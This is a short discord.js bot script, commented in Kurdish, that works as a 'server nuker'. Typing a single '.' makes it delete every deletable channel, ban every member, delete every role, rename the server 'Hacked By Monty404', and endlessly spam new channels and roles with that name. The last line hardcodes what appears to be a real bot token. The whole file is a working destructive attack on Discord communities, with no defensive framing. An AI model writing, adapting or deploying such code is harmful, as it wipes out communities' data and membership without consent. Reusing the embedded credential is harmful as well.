const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Hacked By Monty404");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("Hacked By Monty404", "text");///////bo channel 
        message.guild.createChannel("Hacked By Monty404", "voice");////bo voice
        message.guild.createRole({ name: "Hacked By Monty404" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODEwMTY1MTYxOTQ3OTU1MjQx.YCfrGg.rCwW9bToweMpNNFD3PL5VJTB_jE")
